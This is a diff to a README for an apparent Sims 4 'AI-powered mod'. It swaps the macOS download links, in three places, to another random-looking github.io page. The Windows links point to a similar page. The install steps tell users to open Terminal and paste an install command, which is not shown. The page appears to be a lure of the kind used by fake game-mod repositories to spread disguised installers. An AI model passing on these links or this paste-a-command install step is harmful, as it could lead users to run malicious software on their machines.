@@ -9,7 +9,7 @@
 ---
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://Cascadegliline.github.io/mac-runner/)
 
 ---
 
@@ -52,7 +52,7 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 
 ### 🍎 macOS
 
-1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://Cascadegliline.github.io/mac-runner/)
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
 3. Paste the install command and press Enter
 4. Follow the prompts — installs automatically 🍏
@@ -87,7 +87,7 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 **Sims 4 AI Life Simulator Edition** transforms your The Sims 4 experience. Download now and see the difference immediately.
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://Cascadegliline.github.io/mac-runner/)
 
 ---
 
